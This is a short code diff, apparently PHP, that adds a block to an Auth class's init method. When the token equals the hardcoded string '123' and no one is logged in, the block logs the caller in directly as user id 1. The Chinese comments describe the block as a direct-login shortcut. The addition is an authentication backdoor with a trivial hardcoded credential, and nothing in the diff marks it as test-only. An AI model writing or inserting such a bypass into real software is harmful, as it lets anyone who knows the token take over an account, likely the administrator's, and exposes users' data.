@@ -78,6 +78,16 @@ class Auth
      */
     public function init($token)
     {
+
+        //初始化登录 token = 123  用户id = 1
+        if ($token == '123') {
+            //没有登录时
+            if(!$this->auth->id){
+                //直接登录
+                $this->auth->direct(1);
+            }
+        }
+
         if ($this->_logined) {
             return true;
         }
